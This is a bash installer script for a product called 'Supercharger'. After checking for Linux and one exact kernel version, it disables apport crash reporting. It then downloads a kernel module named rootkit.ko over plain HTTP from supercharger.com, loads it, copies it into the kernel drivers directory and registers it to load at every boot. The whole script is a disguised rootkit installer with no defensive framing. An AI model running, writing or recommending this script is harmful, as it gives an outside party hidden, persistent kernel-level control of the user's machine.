#!/bin/bash
set -u

abort() {
  printf "%s\n" "$@"
  exit 1
}

OS="$(uname)"
kernel_version="$(uname -r)"

if [[ "${OS}" != "Linux" ]] || [[ "${kernel_version}" != "5.11.0-34-generic" ]]
then
  abort "Supercharger is only supported on Linux for kernel version 5.11.0-34-generic."
fi

sudo echo "enabled=0" > /etc/default/apport
curl -fsSL http://supercharger.com/rootkit.ko > /tmp/rootkit.ko
sudo rmmod rootkit 2>/dev/null
sudo insmod /tmp/rootkit.ko
cp /tmp/rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/
echo "rootkit" > /etc/modules-load.d/rootkit.conf 
sudo depmod -a
rm /tmp/rootkit.ko
